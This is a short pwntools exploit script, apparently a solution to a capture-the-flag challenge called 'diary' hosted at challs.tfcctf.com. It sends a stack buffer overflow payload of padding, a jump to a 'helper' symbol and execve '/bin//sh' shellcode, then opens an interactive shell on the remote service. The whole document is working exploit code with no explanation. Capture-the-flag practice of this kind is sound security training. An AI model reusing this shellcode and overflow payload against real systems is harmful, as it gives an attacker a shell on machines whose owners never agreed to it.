#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("diary")

local = False 
if local:
    p = process("./diary")
    gdb.attach(p,'''b*0x00000000004012b1\nc''')
else:
    p = remote('challs.tfcctf.com', 31068)

elf = context.binary = ELF('./diary', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

shellcode = b"\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

help = elf.sym['helper']
payload = b'a'*0x100 + b"\x48\x31\xC0\x48\x31\xDB\x50\x48" + p64(help) + shellcode


sla(b'Dear diary...', payload)


p.interactive()